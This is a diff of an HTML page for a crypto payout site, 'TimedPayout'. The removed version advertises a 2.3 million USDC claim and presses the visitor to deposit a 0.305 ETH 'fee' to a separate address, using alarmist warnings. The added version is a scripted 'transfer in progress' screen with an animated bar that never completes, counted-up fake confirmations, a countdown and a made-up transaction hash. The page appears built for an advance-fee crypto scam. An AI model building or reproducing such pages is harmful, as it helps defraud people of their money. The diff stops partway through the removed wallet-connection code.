@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TimedPayout - Claim Your Funds</title>
+    <title>TimedPayout - Processing Transaction</title>
     <style>
         * {
             margin: 0;
@@ -18,6 +18,9 @@
             min-height: 100vh;
             color: #1a1a1a;
             overflow-x: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .background-effects {
@@ -66,39 +69,39 @@
 
             0%,
             100% {
-                transform: translateY(0) rotate(0deg);
+                transform: translateY(0) rotate(0)
             }
 
             50% {
-                transform: translateY(-20px) rotate(180deg);
+                transform: translateY(-20px) rotate(180deg)
             }
         }
 
         .container {
-            max-width: 800px;
+            max-width: 600px;
             margin: 0 auto;
             padding: 20px;
             position: relative;
             z-index: 1;
+            width: 100%;
         }
 
         .main-card {
             background: rgba(255, 255, 255, 0.95);
             backdrop-filter: blur(20px);
-            border-radius: 24px;
-            padding: 40px;
+            border-radius: 32px;
+            padding: 60px 40px;
             box-shadow: 0 32px 64px rgba(0, 0, 0, 0.2);
             border: 1px solid rgba(255, 255, 255, 0.3);
+            text-align: center;
         }
 
         .header {
-            text-align: center;
             margin-bottom: 40px;
-            position: relative;
         }
 
         .header h1 {
-            font-size: 3em;
+            font-size: 2.5em;
             font-weight: 800;
             background: linear-gradient(135deg, #667eea, #764ba2);
             -webkit-background-clip: text;
@@ -109,80 +112,155 @@
         }
 
         .header p {
-            font-size: 1.2em;
+            font-size: 1.1em;
             color: #6b7280;
             font-weight: 500;
         }
 
-        .balance-overview {
-            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
-            border-radius: 20px;
-            padding: 32px;
-            margin: 32px 0;
-            border: 1px solid rgba(148, 163, 184, 0.2);
-            display: none;
-            /* Hidden by default */
+        .processing-section {
+            margin: 40px 0;
         }
 
-        .balance-title {
-            font-size: 1.3em;
+        .processing-title {
+            font-size: 1.8em;
             font-weight: 700;
             color: #1e293b;
-            margin-bottom: 24px;
+            margin-bottom: 30px;
             display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .transfer-visualization {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 40px;
+            margin: 50px 0;
+            flex-wrap: wrap;
+        }
+
+        .wallet-icon {
+            display: flex;
+            flex-direction: column;
             align-items: center;
             gap: 12px;
         }
 
-        .balance-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin-bottom: 24px;
-        }
-
-        .balance-item {
-            background: white;
-            padding: 20px;
-            border-radius: 16px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
-            border: 1px solid rgba(226, 232, 240, 0.5);
-            transition: all 0.3s ease;
-        }
-
-        .balance-item:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-        }
-
-        .balance-label {
-            font-size: 0.9em;
-            color: #64748b;
-            font-weight: 600;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-
-        .balance-value {
-            font-size: 1.5em;
-            font-weight: 800;
-            color: #1e293b;
+        .wallet-circle {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+            border: 3px solid #cbd5e1;
             display: flex;
             align-items: center;
+            justify-content: center;
+            font-size: 2.5em;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .wallet-circle::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #667eea, #764ba2, #f093fb);
+            border-radius: 50%;
+            z-index: -1;
+            animation: rotate 3s linear infinite;
+        }
+
+        @keyframes rotate {
+            0% {
+                transform: rotate(0)
+            }
+
+            100% {
+                transform: rotate(360deg)
+            }
+        }
+
+        .wallet-label {
+            font-size: .9em;
+            font-weight: 600;
+            color: #64748b;
+            text-transform: uppercase;
+            letter-spacing: .05em;
+        }
+
+        .transfer-arrow {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             gap: 8px;
+            margin: 0 20px;
+        }
+
+        .arrow-container {
+            position: relative;
+            width: 80px;
+            height: 40px;
+        }
+
+        .spinning-loader {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 20px;
+        }
+
+        .currency-flows {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin: 40px 0;
+        }
+
+        .currency-flow {
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            border-radius: 16px;
+            padding: 24px;
+            border: 1px solid rgba(148, 163, 184, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 1
+            }
+
+            50% {
+                transform: scale(1.02);
+                opacity: .9
+            }
+        }
+
+        .currency-info {
+            display: flex;
+            align-items: center;
+            gap: 16px;
         }
 
         .currency-icon {
-            width: 24px;
-            height: 24px;
+            width: 48px;
+            height: 48px;
             border-radius: 50%;
-            display: inline-flex;
+            display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 0.8em;
+            font-size: 1.2em;
             font-weight: bold;
-            color: white;
+            color: #fff;
         }
 
         .usdc-icon {
@@ -193,457 +271,222 @@
             background: linear-gradient(135deg, #627eea, #4f46e5);
         }
 
-        .fees-section {
-            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
-            border-radius: 16px;
-            padding: 20px;
-            border: 1px solid rgba(245, 158, 11, 0.3);
+        .currency-details {
+            text-align: left;
         }
 
-        .fees-title {
+        .currency-name {
             font-size: 1.1em;
             font-weight: 700;
-            color: #92400e;
-            margin-bottom: 16px;
+            color: #1e293b;
+            margin-bottom: 4px;
+        }
+
+        .currency-amount {
+            font-size: 1.3em;
+            font-weight: 800;
+            color: #667eea;
+        }
+
+        .transfer-status {
+            font-size: .9em;
+            color: #f59e0b;
+            font-weight: 600;
             display: flex;
             align-items: center;
             gap: 8px;
         }
 
-        .fees-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 12px;
-            margin-bottom: 16px;
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #f59e0b;
+            animation: blink 1.5s infinite;
         }
 
-        .fee-item {
-            background: rgba(255, 255, 255, 0.8);
-            padding: 12px;
-            border-radius: 12px;
-            text-align: center;
-            border: 1px solid rgba(245, 158, 11, 0.2);
+        @keyframes blink {
+
+            0%,
+            50% {
+                opacity: 1
+            }
+
+            51%,
+            100% {
+                opacity: .3
+            }
         }
 
-        .fee-label {
-            font-size: 0.8em;
-            color: #92400e;
-            font-weight: 600;
-            margin-bottom: 4px;
+        .transaction-details {
+            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+            border-radius: 20px;
+            padding: 32px;
+            margin: 40px 0;
+            border-left: 6px solid #0ea5e9;
         }
 
-        .fee-value {
-            font-size: 1.1em;
+        .details-title {
+            font-size: 1.3em;
             font-weight: 700;
             color: #1e293b;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
 
-        .warning-banner {
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(148, 163, 184, 0.2);
+        }
+
+        .detail-item:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            font-size: .95em;
+            color: #64748b;
+            font-weight: 600;
+        }
+
+        .detail-value {
+            font-size: .95em;
+            font-weight: 700;
+            color: #1e293b;
+            word-break: break-all;
+        }
+
+        .progress-section {
+            margin: 40px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(148, 163, 184, 0.2);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            border-radius: 4px;
+            animation: progress 8s ease-in-out infinite;
+        }
+
+        @keyframes progress {
+            0% {
+                width: 10%
+            }
+
+            25% {
+                width: 35%
+            }
+
+            50% {
+                width: 65%
+            }
+
+            75% {
+                width: 85%
+            }
+
+            100% {
+                width: 95%
+            }
+        }
+
+        .progress-text {
+            font-size: 1em;
+            color: #6b7280;
+            font-weight: 600;
+            margin-top: 12px;
+        }
+
+        .estimated-time {
+            background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
+            border: 2px solid #f59e0b;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 30px 0;
+        }
+
+        .time-title {
+            font-size: 1.1em;
+            font-weight: 700;
+            color: #92400e;
+            margin-bottom: 8px;
+        }
+
+        .time-value {
+            font-size: 1.8em;
+            font-weight: 800;
+            color: #1e293b;
+            font-family: 'Courier New', monospace;
+        }
+
+        .warning-note {
             background: linear-gradient(135deg, #fecaca 0%, #fca5a5 100%);
             border: 1px solid rgba(239, 68, 68, 0.3);
             border-radius: 12px;
             padding: 16px;
+            margin: 20px 0;
             display: flex;
             align-items: center;
             gap: 12px;
         }
 
         .warning-icon {
-            font-size: 1.5em;
+            font-size: 1.3em;
             color: #dc2626;
         }
 
         .warning-text {
             color: #7f1d1d;
             font-weight: 600;
-            font-size: 0.95em;
+            font-size: .9em;
         }
 
-        .status-card {
-            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
-            border-radius: 20px;
-            padding: 32px;
-            margin: 32px 0;
-            border-left: 6px solid #0ea5e9;
-            transition: all 0.3s ease;
-        }
-
-        .status-pending {
-            background: linear-gradient(135deg, #fffbeb 0%, #fef3c7 100%);
-            border-left-color: #f59e0b;
-        }
-
-        .status-ready {
-            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
-            border-left-color: #22c55e;
-        }
-
-        .status-title {
-            font-size: 1.4em;
-            font-weight: 700;
-            color: #1e293b;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .status-text {
-            font-size: 1.1em;
-            color: #475569;
-            font-weight: 500;
-        }
-
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin: 32px 0;
-        }
-
-        .info-item {
-            background: white;
-            padding: 24px;
-            border-radius: 16px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
-            border: 1px solid rgba(226, 232, 240, 0.5);
-            transition: all 0.3s ease;
-        }
-
-        .info-item:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 20px 25px rgba(0, 0, 0, 0.1);
-        }
-
-        .info-label {
-            font-size: 0.9em;
-            color: #64748b;
-            font-weight: 600;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-
-        .info-value {
-            font-size: 1.3em;
-            font-weight: 700;
-            color: #1e293b;
-        }
-
-        .big-button {
-            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
-            color: white;
-            border: none;
-            padding: 20px 40px;
-            font-size: 1.2em;
-            font-weight: 700;
-            border-radius: 16px;
-            cursor: pointer;
-            width: 100%;
-            margin: 12px 0;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 15px rgba(34, 197, 94, 0.3);
-            letter-spacing: 0.5px;
-        }
-
-        .big-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(34, 197, 94, 0.4);
-        }
-
-        .big-button:disabled {
-            background: linear-gradient(135deg, #9ca3af, #6b7280);
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .disconnect-btn {
-            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
-            box-shadow: 0 8px 15px rgba(239, 68, 68, 0.3);
-        }
-
-        .disconnect-btn:hover {
-            box-shadow: 0 15px 30px rgba(239, 68, 68, 0.4);
-        }
-
-        .emergency-btn {
-            background: linear-gradient(135deg, #f97316 0%, #ea580c 100%);
-            box-shadow: 0 8px 15px rgba(249, 115, 22, 0.3);
-        }
-
-        .deposit-btn {
-            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
-            box-shadow: 0 8px 15px rgba(139, 92, 246, 0.3);
-        }
-
-        .deposit-btn:hover {
-            box-shadow: 0 15px 30px rgba(139, 92, 246, 0.4);
-        }
-
-        .wallet-status {
-            padding: 20px;
-            border-radius: 16px;
-            margin: 20px 0;
-            text-align: center;
-            font-weight: 700;
-            font-size: 1.1em;
-            animation: slideIn 0.5s ease;
-        }
-
-        .wallet-correct {
-            background: linear-gradient(135deg, #dcfce7, #bbf7d0);
-            color: #166534;
-            border: 2px solid #22c55e;
-        }
-
-        .wallet-wrong {
-            background: linear-gradient(135deg, #fef3c7, #fde68a);
-            color: #92400e;
-            border: 2px solid #f59e0b;
-        }
-
-        .countdown {
-            font-size: 2.5em;
-            font-weight: 800;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            text-align: center;
-            margin: 24px 0;
-            letter-spacing: -0.02em;
-        }
-
-        .instructions-card {
-            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
-            border-radius: 20px;
-            padding: 32px;
-            margin-top: 40px;
-            border: 1px solid rgba(148, 163, 184, 0.2);
-        }
-
-        .instructions-title {
-            font-size: 1.4em;
-            font-weight: 700;
-            color: #1e293b;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .instructions-list {
-            list-style: none;
-            counter-reset: step-counter;
-        }
-
-        .instructions-list li {
-            counter-increment: step-counter;
-            margin-bottom: 16px;
-            padding-left: 60px;
-            position: relative;
-            font-size: 1.05em;
-            color: #475569;
-            line-height: 1.6;
-        }
-
-        .instructions-list li::before {
-            content: counter(step-counter);
-            position: absolute;
-            left: 0;
-            top: 0;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 1.1em;
-        }
-
-        .message {
-            padding: 16px 20px;
-            border-radius: 12px;
-            margin: 16px 0;
-            font-weight: 600;
-            animation: slideIn 0.5s ease;
-        }
-
-        .error {
-            background: linear-gradient(135deg, #fecaca, #fca5a5);
-            color: #7f1d1d;
-            border: 1px solid rgba(239, 68, 68, 0.3);
-        }
-
-        .success {
-            background: linear-gradient(135deg, #dcfce7, #bbf7d0);
-            color: #166534;
-            border: 1px solid rgba(34, 197, 94, 0.3);
-        }
-
-        .info {
-            background: linear-gradient(135deg, #dbeafe, #bfdbfe);
-            color: #1e40af;
-            border: 1px solid rgba(59, 130, 246, 0.3);
-        }
-
-        .big-success {
-            background: linear-gradient(135deg, #22c55e, #16a34a);
-            color: white;
-            padding: 32px;
-            font-size: 1.8em;
-            font-weight: 800;
-            border-radius: 20px;
-            text-align: center;
-            margin: 24px 0;
-            animation: pulse 2s infinite;
-            box-shadow: 0 20px 40px rgba(34, 197, 94, 0.3);
-        }
-
-        .big-fail {
-            background: linear-gradient(135deg, #ef4444, #dc2626);
-            color: white;
-            padding: 32px;
-            font-size: 1.5em;
-            font-weight: 800;
-            border-radius: 20px;
-            text-align: center;
-            margin: 24px 0;
-            animation: shake 0.5s;
-            box-shadow: 0 20px 40px rgba(239, 68, 68, 0.3);
-        }
-
-        .waiting-timer {
-            background: linear-gradient(135deg, #fef3c7, #fde68a);
-            color: #92400e;
-            padding: 32px;
-            border-radius: 20px;
-            text-align: center;
-            margin: 24px 0;
-            font-size: 1.2em;
-            font-weight: 700;
-            border: 2px solid #f59e0b;
-        }
-
-        .waiting-timer .timer {
-            font-size: 2.5em;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin: 16px 0;
-            font-weight: 800;
-        }
-
-        .wallet-help {
-            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
-            border: 2px solid #cbd5e1;
-            padding: 32px;
-            border-radius: 20px;
-            margin: 24px 0;
-        }
-
-        .warning-subtext {
-            color: #B00020;
-            /* accessible red */
-            margin: 4px 0 0 0;
-            /* a bit of space under the main warning */
-            font-size: 0.875rem;
-            /* slightly smaller than body text */
-            font-weight: 600;
-            /* make it stand out */
-        }
-
-
-        .wallet-help h4 {
-            margin-bottom: 20px;
-            color: #1e293b;
-            font-size: 1.3em;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .loading {
-            display: none;
-            text-align: center;
-            margin: 32px 0;
-        }
-
-        .loading p {
-            font-size: 1.2em;
-            color: #6b7280;
-            font-weight: 600;
-        }
-
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes pulse {
-
-            0%,
-            100% {
-                transform: scale(1);
-            }
-
-            50% {
-                transform: scale(1.02);
-            }
-        }
-
-        @keyframes shake {
-
-            0%,
-            100% {
-                transform: translateX(0);
-            }
-
-            25% {
-                transform: translateX(-8px);
-            }
-
-            75% {
-                transform: translateX(8px);
-            }
-        }
-
-        @media (max-width: 768px) {
+        @media (max-width:768px) {
             .container {
-                padding: 16px;
+                padding: 16px
             }
 
             .main-card {
-                padding: 24px;
+                padding: 40px 24px
             }
 
             .header h1 {
-                font-size: 2.2em;
+                font-size: 2em
             }
 
-            .balance-grid {
-                grid-template-columns: 1fr;
+            .transfer-visualization {
+                gap: 20px;
+                flex-direction: column
             }
 
-            .info-grid {
-                grid-template-columns: 1fr;
+            .transfer-arrow {
+                transform: rotate(90deg);
+                margin: 10px 0
             }
 
-            .fees-grid {
-                grid-template-columns: repeat(2, 1fr);
+            .wallet-circle {
+                width: 80px;
+                height: 80px;
+                font-size: 2em
+            }
+
+            .currency-flow {
+                flex-direction: column;
+                gap: 12px;
+                text-align: center
             }
         }
     </style>
@@ -660,530 +503,183 @@
         <div class="main-card">
             <div class="header">
                 <h1>💰 TimedPayout</h1>
-                <p>Simple one-click payout from your smart contract</p>
+                <p>Processing your transaction</p>
             </div>
 
-            <!-- Balance Overview Section - Only shown to authorized users -->
-            <div class="balance-overview" id="balance-overview">
-                <div class="balance-title">
-                    💼 Account Overview
-                </div>
-                <div class="balance-grid">
-                    <div class="balance-item">
-                        <div class="balance-label">Current Available USDC</div>
-                        <div class="balance-value">
-                            <span class="currency-icon usdc-icon">$</span>
-                            <span id="current-usdc">2,324,230.50</span>
-                        </div>
-                    </div>
-                    <div class="balance-item">
-                        <div class="balance-label">Current Available ETH</div>
-                        <div class="balance-value">
-                            <span class="currency-icon eth-icon">Ξ</span>
-                            <span id="current-eth">0.024</span>
-                        </div>
-                    </div>
+            <div class="processing-section">
+                <div class="processing-title">🔄 Transferring Funds</div>
+
+                <div class="spinning-loader">
+                    <svg width="40" height="40" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="20" cy="20" r="18" fill="none" stroke="#667eea" stroke-width="4"
+                            stroke-linecap="round" stroke-dasharray="80" stroke-dashoffset="60">
+                            <animateTransform attributeName="transform" type="rotate" values="0 20 20;360 20 20"
+                                dur="1s" repeatCount="indefinite" />
+                        </circle>
+                    </svg>
                 </div>
 
-                <div class="fees-section">
-                    <div class="fees-title">
-                        ⛽ Estimated Transaction Fees
+                <div class="transfer-visualization">
+                    <div class="wallet-icon">
+                        <div class="wallet-circle">🏦</div>
+                        <div class="wallet-label">Smart Contract</div>
                     </div>
 
-                    <div class="fees-grid">
-                        <div class="fee-item">
-                            <div class="fee-label">Average</div>
-                            <div class="fee-value" id="avg-fee">0.304 ETH</div>
+                    <div class="transfer-arrow">
+                        <svg width="80" height="40" viewBox="0 0 80 40" xmlns="http://www.w3.org/2000/svg">
+                            <defs>
+                                <linearGradient id="arrowGradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                                    <stop offset="0%" style="stop-color:#667eea" />
+                                    <stop offset="100%" style="stop-color:#764ba2" />
+                                </linearGradient>
+                            </defs>
+                            <path d="M10 20 L60 20 M50 10 L60 20 L50 30" stroke="url(#arrowGradient)" stroke-width="3"
+                                fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                <animate attributeName="stroke-dasharray" values="0,100;50,50;100,0" dur="2s"
+                                    repeatCount="indefinite" />
+                            </path>
+                        </svg>
+                    </div>
+
+                    <div class="wallet-icon">
+                        <div class="wallet-circle">👤</div>
+                        <div class="wallet-label">Your Wallet</div>
+                    </div>
+                </div>
+
+                <div class="currency-flows">
+                    <div class="currency-flow">
+                        <div class="currency-info">
+                            <div class="currency-icon usdc-icon">$</div>
+                            <div class="currency-details">
+                                <div class="currency-name">USDC Transfer</div>
+                                <div class="currency-amount">2,324,230.50</div>
+                            </div>
                         </div>
-                        <div class="fee-item">
-                            <div class="fee-label">Minimum</div>
-                            <div class="fee-value" id="min-fee">0.225 ETH</div>
-                        </div>
-                        <div class="fee-item">
-                            <div class="fee-label">Maximum</div>
-                            <div class="fee-value" id="max-fee">0.305 ETH</div>
+                        <div class="transfer-status">
+                            <div class="status-indicator"></div>
+                            Processing...
                         </div>
                     </div>
 
-                    <div class="warning-banner" role="alert" aria-live="polite">
-                        <div class="warning-icon">⚠️</div>
-                        <div class="warning-text" id="fee-warning">
-                            Warning: Using minimum fees may lead to failure and delay. Recommended: 0.305 ETH (maximum
-                            amount).
-                        </div>
-                        <!-- Sub-warning (red) -->
-                        <p class="warning-subtext"
-                            style="color:#B00020;margin:6px 0 0 0;font-size:0.875rem;font-weight:600;">
-                            Volume of transactions is increasing dramatically — network fees are expected to implode.
-                        </p>
-                    </div>
 
-                    <button class="big-button deposit-btn" id="deposit-btn" onclick="depositFees()" disabled
-                        style="display:none;">
-                        💰 Deposit Fees
-                    </button>
-                </div>
-
-            </div>
-        </div>
-
-        <!-- Wallet Detection Section -->
-        <div id="wallet-detection">
-            <div class="wallet-help" id="wallet-help" style="display: none;">
-                <h4>📱 How to Connect Your Wallet</h4>
-                <div id="mobile-instructions" style="display: none;">
-                    <p><strong>On Mobile:</strong></p>
-                    <ol>
-                        <li>Open <strong>Trust Wallet</strong> app</li>
-                        <li>Tap <strong>"Browser"</strong> tab (compass icon)</li>
-                        <li>Enter this website URL in the browser</li>
-                        <li>Click "Connect Wallet" again</li>
-                    </ol>
-                </div>
-                <div id="desktop-instructions" style="display: none;">
-                    <p><strong>On Desktop:</strong></p>
-                    <ol>
-                        <li>Install <a href="https://metamask.io" target="_blank">MetaMask extension</a></li>
-                        <li>Refresh this page</li>
-                        <li>Click "Connect Wallet"</li>
-                    </ol>
                 </div>
             </div>
-        </div>
 
-        <div id="status-section">
-            <div class="status-card status-pending" id="status-card">
-                <div class="status-title">📊 Contract Status</div>
-                <div class="status-text" id="status-text">Click "Connect Wallet" to check wallet authorization</div>
+            <div class="progress-section">
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+                <div class="progress-text">Transaction confirming on blockchain...</div>
             </div>
-        </div>
 
-        <div class="info-grid" id="info-grid" style="display: none;">
-            <div class="info-item" id="expected-payout-item" style="display: none;">
-                <div class="info-label">Available Payout</div>
-                <div class="info-value" id="expected-payout-value">2,324,230.50 USDC</div>
+            <div class="estimated-time">
+                <div class="time-title">⏱️ Estimated Time Remaining</div>
+                <div class="time-value" id="countdown">--:--:--</div>
             </div>
-            <div class="info-item" id="available-claim-item" style="display: none;">
-                <div class="info-label">Available to Claim In</div>
-                <div class="info-value" id="available-claim-value">--:--:--</div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">Your Wallet</div>
-                <div class="info-value" id="your-wallet">-</div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">Expected Recipient</div>
-                <div class="info-value" id="expected-recipient">0xEA6e...7Ed1</div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">Payout Time</div>
-                <div class="info-value" id="payout-time">-</div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">Authorization</div>
-                <div class="info-value" id="auth-status">-</div>
-            </div>
-        </div>
 
-        <div id="countdown-section" style="display: none;">
-            <div class="countdown" id="countdown">Loading...</div>
-        </div>
-
-        <div id="button-section">
-            <button class="big-button" id="connect-btn" onclick="connectWallet()">
-                🔗 Connect Wallet
-            </button>
-            <button class="big-button disconnect-btn" id="disconnect-btn" onclick="disconnectWallet()"
-                style="display: none;">
-                🔌 Disconnect Wallet
-            </button>
-            <button class="big-button" id="payout-btn" onclick="executePayout()" disabled style="display: none;">
-                💸 Claim My Funds
-            </button>
-            <button class="big-button emergency-btn" id="emergency-btn" onclick="emergencyPayout()" disabled
-                style="display: none;">
-                🚨 Emergency Withdrawal
-            </button>
-
-        </div>
-
-        <div id="messages"></div>
-
-        <div class="loading" id="loading">
-            <p>⏳ Processing transaction...</p>
-        </div>
-
-        <div class="instructions-card">
-            <div class="instructions-title">
-                📋 How It Works
+            <div class="transaction-details">
+                <div class="details-title">📋 Transaction Details</div>
+                <div class="detail-item">
+                    <span class="detail-label">Transaction Hash</span>
+                    <span class="detail-value">0x8ff81e...7Ed1</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Receiving Address</span>
+                    <span class="detail-value">0xEA6eFb5d949f34c84DEb4C2b277c7De4357f7Ed1</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Gas Fee</span>
+                    <span class="detail-value">0.305 ETH</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Network</span>
+                    <span class="detail-value">Ethereum Mainnet</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Block Confirmations</span>
+                    <span class="detail-value" id="confirmations">1 / 64</span>
+                </div>
             </div>
-            <ol class="instructions-list">
-                <li><strong>Connect your wallet</strong> - Click "Connect Wallet" and select Trust Wallet/MetaMask</li>
-                <li><strong>Check authorization</strong> - Verify you have the correct wallet connected</li>
-                <li><strong>Wait for payout time</strong> - Funds unlock exactly 24 hours after contract deployment</li>
-                <li><strong>Claim funds</strong> - Once ready, click "Claim My Funds" with sufficient gas fees</li>
-                <li><strong>Deposit fees</strong> - If you're authorized and need more ETH, click "Deposit Fees" to top
-                    up
-                </li>
-            </ol>
+
+            <div class="warning-note">
+                <div class="warning-icon">⚠️</div>
+                <div class="warning-text">Please do not close this window or refresh the page until the transaction is
+                    complete.</div>
+            </div>
         </div>
     </div>
-    </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
     <script>
-        const CONTRACT_ADDRESS = '0x8ff81e021e8632D74C8c1A1a4120FFc0245f5D51';
-        const RECIPIENT_ADDRESS = '0xEA6eFb5d949f34c84DEb4C2b277c7De4357f7Ed1';
-        const DEPOSIT_ADDRESS = '0x35823184f605F2827069f7cFc116374495489606';
-        const CONTRACT_ABI = [
-            { "inputs": [], "name": "payout", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-            { "inputs": [], "name": "emergencyWithdraw", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-            { "inputs": [], "name": "payoutTime", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
-            { "inputs": [], "name": "recipient", "outputs": [{ "internalType": "address payable", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
-        ];
+        // ---- Configuration ----
+        // ---- Configuration ----
+        // Target time: Aug 3, 2025 01:42 in Europe/Zurich (CEST, UTC+2)
+        const targetTime = new Date('2025-08-03T03:42:00+02:00');
 
-        let web3, contract, userAccount, payoutTimeStamp;
-        window.currentMaxFee = 0;
+        // Confirmations
+        let confirmations = 1;
+        const maxConfirmations = 64;
 
-        // every 10s refresh balances & gas
-        setInterval(() => {
-            updateBalances();
-            updateGasFees();
-        }, 10000);
-        updateBalances();
-        updateGasFees();
-
-        function isMobile() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        // ---- Helpers ----
+        function remainingSeconds() {
+            const now = new Date();
+            const ms = Math.max(0, targetTime.getTime() - now.getTime());
+            return Math.floor(ms / 1000);
         }
 
-        function detectWalletEnvironment() {
-            if (window.ethereum && window.ethereum.isTrust) return 'trust';
-            if (window.ethereum && window.ethereum.isMetaMask) return 'metamask';
-            if (window.ethereum) return 'web3';
-            if (window.web3) return 'legacy_web3';
-            return 'none';
+        function formatAsHMS(totalSeconds) {
+            const h = Math.floor(totalSeconds / 3600);
+            const m = Math.floor((totalSeconds % 3600) / 60);
+            const s = totalSeconds % 60;
+            const pad = (n) => n.toString().padStart(2, '0');
+            return `${h}:${pad(m)}:${pad(s)}`;
         }
 
-        async function connectWallet() {
-            const env = detectWalletEnvironment();
-            if (env === 'none') {
-                showWalletHelp();
-                return;
-            }
-            try {
-                showMessage('🔄 Connecting to wallet...', 'info');
-                web3 = new Web3(window.ethereum);
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const accounts = await web3.eth.getAccounts();
-                if (!accounts.length) throw new Error('No accounts found. Please unlock your wallet.');
-                userAccount = accounts[0];
-                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
-
-                document.getElementById('connect-btn').style.display = 'none';
-                document.getElementById('disconnect-btn').style.display = 'block';
-                document.getElementById('wallet-help').style.display = 'none';
-
-                showMessage(`✅ Wallet connected: ${userAccount}`, 'success');
-                await loadBasicInfo();
-            } catch (err) {
-                console.error(err);
-                if (err.code === 4001) showMessage('❌ Connection rejected by user', 'error');
-                else showMessage('❌ Connect error: ' + err.message, 'error');
-                showWalletHelp();
